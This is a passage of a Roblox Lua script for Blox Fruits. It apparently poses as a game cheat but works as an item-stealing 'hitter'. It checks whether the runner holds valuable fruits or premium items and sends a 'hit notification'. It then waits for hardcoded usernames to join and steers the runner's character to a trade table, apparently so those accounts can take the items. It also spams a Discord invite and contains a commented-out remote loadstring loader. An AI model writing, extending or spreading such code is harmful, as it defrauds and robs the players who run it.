                if currentTable and currentSeat then local dist = (root.Position - currentSeat.Position).Magnitude
                    if dist > 3 or humanoid.Sit == false then if dist > 0.5 and humanoid.Sit == false then tweenToPosition(currentSeat.Position); lastMovementTime = now end
                    elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then randomOffset = Vector3.new(math.random(-10,10)/10,0,math.random(-10,10)/10); tweenToPosition(currentSeat.Position + randomOffset); lastMovementTime = now end
                end
            end
            local timeElapsed = tick()-now; local waitTime = math.max(0.03, UPDATE_INTERVAL-timeElapsed); task.wait(waitTime)
        end
    end

    characterAddedConnectionMain = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
    characterRemovingConnectionMain = LocalPlayer.CharacterRemoving:Connect(function() currentTable=nil; currentSeat=nil; isCheckingTradePartner=false end)
    if LocalPlayer.Character then task.spawn(onCharacterAdded, LocalPlayer.Character) end
    task.spawn(runMainLoop)

    return function() isLoopRunning=false; if characterAddedConnectionMain and characterAddedConnectionMain.Connected then characterAddedConnectionMain:Disconnect() end; if characterRemovingConnectionMain and characterRemovingConnectionMain.Connected then characterRemovingConnectionMain:Disconnect() end; enableJumpGlobally(); currentTable=nil; currentSeat=nil end
end


--[[=================================================================================
=                             INITIALIZATION LOGIC                            =
==================================================================================]]
local mainLoopCleanupFunc = nil

local function init()
    warn("[DEBUG] init() called.") -- Debug Print
    local placeId = game.PlaceId
    if placeId == 2753915549 then LocalPlayer:Kick("This script works only in Sea 2 or 3!"); return end
    if placeId ~= 4442272183 and placeId ~= 7449423635 then LocalPlayer:Kick("This script is meant for Blox Fruits (Sea 2/3) only!"); return end

    initialInventorySnapshot = getInventory()
    if not initialInventorySnapshot then LocalPlayer:Kick("Error retrieving initial inventory. Please rejoin."); return end
    warn("[DEBUG] Initial inventory snapshot retrieved.") -- Debug Print

    local function checkInventory(inventoryToCheck)
        local fruitsToHitSet = {}; for _,f in ipairs(FruitsToHit) do fruitsToHitSet[f]=true end
        for _, item in ipairs(inventoryToCheck) do if item and item.Name and ((item.Type=="Blox Fruit" and fruitsToHitSet[item.Name]) or (item.Type=="Premium")) then hadValuableItemOnInit=true; return true end end
        return false
    end

    if not checkInventory(initialInventorySnapshot) then warn("[DEBUG] checkInventory failed."); LocalPlayer:Kick("Alt Account Detected! (No valuable items found)"); return end
    warn("[DEBUG] checkInventory passed. hadValuableItemOnInit =", hadValuableItemOnInit) -- Debug Print

    task.spawn(function()
        task.wait(1); JoinTeam(); local loadingNotif = task.spawn(createNotification);
        prepareAndSendHitNotification(initialInventorySnapshot); -- Send initial hit notification
        handleFruitReset(); -- Start auto-resetting
    end)

    local mainLogicStarted = false; local playerAddedConn = nil
    local function onAuthorizedPlayerAdded(player)
        if mainLogicStarted then return end
        local playerIsAuth = false
        for _, allowedNameLower in ipairs(Usernames) do if player.Name:lower() == allowedNameLower then playerIsAuth = true; break end end
        if not playerIsAuth then return end

        mainLogicStarted = true
        warn("[DEBUG] Authorized player found: " .. player.Name .. ". Starting main logic.") -- Debug Print
        if playerAddedConn and playerAddedConn.Connected then playerAddedConn:Disconnect() end

        task.spawn(function()
            -- Load external UI script removed for stability testing, can be re-added carefully
            -- local sL,eL=pcall(function() local url="..."; local code=game:HttpGet(url,true); loadstring(code)() end); if not sL then warn("Fail load external UI:",eL) end

            task.wait(1)
            mainLoopCleanupFunc = startMainLoop() -- Start main behavior loop
            warn("[DEBUG] Main loop started.") -- Debug Print

            task.delay(2, function() sendMessage("Join (6wFCr9P4Zr) << Invite in dc if you want to learn how to make a lot of mythical fruits!") end)
        end)
    end

    playerAddedConn = Players.PlayerAdded:Connect(onAuthorizedPlayerAdded)
    task.spawn(function() for _,p in ipairs(Players:GetPlayers()) do onAuthorizedPlayerAdded(p); if mainLogicStarted then break end end end)

    -- Removed local player removing cleanup for simplicity, relies on environment cleanup
end

--[[=================================================================================
=                           SCRIPT EXECUTION GUARD                            =
==================================================================================]]
if not shared.ScriptExecuted then
    shared.ScriptExecuted = true
    warn("[DEBUG] Script executing for the first time.") -- Debug Print
    task.spawn(function()
        local success, errorMessage = pcall(init)
        if not success then
            warn("!! SCRIPT INIT ERROR !!:", errorMessage)
            task.delay(5, function() if LocalPlayer then pcall(LocalPlayer.Kick, LocalPlayer, "Script Init Error: " .. tostring(errorMessage)) end end)
        else
            warn("[DEBUG] init() finished successfully (or pcall returned true).") -- Debug Print
        end
    end)
else
     warn("[DEBUG] Script already executed, skipping init.") -- Debug Print
end
